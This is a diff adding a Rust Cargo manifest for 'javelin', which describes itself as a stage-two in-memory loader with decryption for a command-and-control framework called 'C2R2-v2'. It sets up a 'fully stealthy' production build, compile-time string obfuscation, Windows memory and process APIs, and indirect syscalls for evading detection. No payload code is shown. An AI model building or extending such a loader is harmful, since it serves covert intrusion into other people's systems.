@@ -1,0 +1,47 @@
+[package]
+name = "javelin"
+version = "2.0.0"
+edition = "2021"
+description = "Stage 2: JAVELIN - In-memory loader with decryption for C2R2-v2"
+
+[features]
+default = ["dev"]
+dev = []  # Development mode: console window + debug prints
+production = []  # Production mode: no console, no debug prints, fully stealthy
+
+[dependencies]
+# String obfuscation at compile-time
+obfstr = "0.4"
+# Random number generation
+rand = "0.8"
+# For base64 encoding/decoding
+base64 = "0.22"
+
+[target.'cfg(windows)'.dependencies]
+winapi = { version = "0.3", features = [
+    "errhandlingapi",
+    "libloaderapi",
+    "memoryapi",
+    "winnt",
+    "minwindef",
+    "ntdef",
+    "processthreadsapi",
+    "synchapi",
+    "winbase",
+    "handleapi",
+    "sysinfoapi",
+    "fileapi"
+] }
+# Indirect syscalls for memory operations
+dinvk = "0.4"
+
+[[bin]]
+name = "javelin"
+path = "src/main.rs"
+
+[lib]
+name = "javelin"
+path = "src/lib.rs"
+
+[build-dependencies]
+winres = "0.1.12"
